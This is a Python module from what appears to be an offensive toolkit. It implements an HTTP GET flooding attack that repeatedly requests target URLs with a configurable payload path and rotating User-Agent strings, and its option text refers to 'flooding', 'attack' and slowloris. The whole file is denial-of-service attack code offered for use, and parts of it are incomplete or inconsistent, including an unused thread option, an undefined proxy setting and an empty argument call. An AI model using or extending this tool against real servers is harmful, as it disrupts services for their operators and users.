import urllib3
import requests
import os
import random

from lib.cmd_tool import *

NAME = 'HttpGET'

class Module:
    def __init__(self):
        self.config = {
            'URLs': {
                'value': '',
                'help': 'Target URLs.',
            },
            'UrlFile': {
                'value': '',
                'help': 'Targets file.',
            },
            'Count': {
                'value': '100',
                'help': 'HTTP request count.',
            },
            'Thread': {
                'value': '20',
                'help': 'Thread count.',
            },
            'Timeout': {
                'value': '10',
                'help': 'HTTP request timeout(second).',
            },
            'Time': {
                'value': '10',
                'help': 'Stop attack after specified time.',
            },
            'DefaultUA': {
                'value': DEFAULT_UA,
                'help': 'Default HTTP web request User-Agent.',
            },
            'UAfile': {
                'value': '',
                'help': 'User-Agent file.',
            },
            'Payload': {
                'value': '/hellohellohello',
                'help': 'HTTP GET payload.',
            },
            'Mode': {
                'value': '0',
                'help': 'Flooding mode.',
                'option': {
                    TARGET_SPECIFIED: 'Do slowloris to specified targets.',
                    TARGET_FILE: 'Obtain targets from specified file.'
                }
            },
        }

        self.help = ''

    def validate(self):
        szURLs = get_value(self.config, 'URLs')
        szUrlFile = get_value(self.config, 'UrlFile')
        szCount = get_value(self.config, 'Count')
        szTimeout = get_value(self.config, 'Timeout')
        szUaFile = get_value(self.config, 'UAfile')
        szProxyFile = get_value(self.config, 'ProxyFile')

        nOptionIdx = get_optionIdx(self.config, 'Mode')

        if nOptionIdx == TARGET_SPECIFIED and not szURLs:
            cp.pf_failed('"URLs" cannot be null or empty.')
            return False
        
        if nOptionIdx == TARGET_FILE and not os.path.exists(szUrlFile):
            cp.pf_failed('Cannot find file: ' + szUrlFile)
            return False
        
        if not szCount or not szCount.isdigit() or int(szCount) <= 0:
            cp.pf_failed('Invalid count.')
            return False
        
        if not szTimeout or not szTimeout.isdigit() or int(szTimeout) <= 0:
            cp.pf_failed('Invalid timeout.')
            return False
        
        if szUaFile and not os.path.exists(szUaFile):
            cp.pf_failed('Path not exists: ' + szUaFile)
            return False
        
        if szProxyFile and not os.path.exists(szProxyFile):
            cp.pf_failed('Path not exists: ' + szProxyFile)

        return True

    def interactive(self):
        interactive(self, 'http_get')

    def get_lsURL(self) -> list:
        nOptIdx = get_optionIdx(self.config, 'Mode')
        if nOptIdx == TARGET_SPECIFIED:
            return str2strls(get_value(self.config, 'URLs'))
        elif nOptIdx == TARGET_FILE:
            with open(get_value(self.config, 'UrlFile')) as f:
                return f.readlines()
        else:
            cp.pf_failed(f'Unknown option: {nOptIdx}')
            return []
        
    def get_proxy(self):
        pass

    def get_szUA(self) -> str:
        szUA = get_value(self.config, 'DefaultUA')
        szUaFile = get_value(self.config, 'UAfile')

        if szUaFile:
            if not os.path.exists(szUaFile):
                cp.pf_warn('Cannot find file: ' + szUaFile)
            
            with open(szUaFile) as f:
                lsUA = f.readlines()
                return lsUA[random.randint(0, len(lsUA) - 1)]
        
        else:
            return szUA

    def run(self):
        def req_get(szUrl: str, szPayload: str, szUA: str, nTimeout: int):
            szUrl = szUrl + szPayload
            headers = {
                'User-Agent': szUA,
            }

            requests.get(szUrl, timeout=nTimeout, headers=headers)

        try:
            lsURL = self.get_lsURL()
            nCnt = int(get_value(self.config, 'Count'))
            szUA = self.get_szUA()
            nTimeout = int(get_value(self.config, 'Timeout'))
            nSecond = int(get_value(self.config, 'Time'))
            szPayload = get_value(self.config, 'Payload')
            nMode = get_optionIdx(self.config, 'Mode')

            if not szUA:
                szUA = DEFAULT_UA

            if len(lsURL) == 0:
                cp.pf_warn('URL list is empty.')
                cp.pf_failed('Process terminated.')

                return

            if len(lsURL) > 1:
                x = len(lsURL) * nCnt
                cp.pf_warn(f'Target is more then one, the total request count will be {len(lsURL)}x{nCnt}={x}')

            if nMode == TARGET_SPECIFIED:
                for url in lsURL:
                    for _ in range(0, nCnt):
                        req_get(url, szPayload, szUA, nTimeout)

            elif nMode == TARGET_FILE:
                for url in lsURL:
                    doWorkWithSeconds(req_get, nSecond, {})

        except Exception as ex:
            cp.pf_failed(str(ex))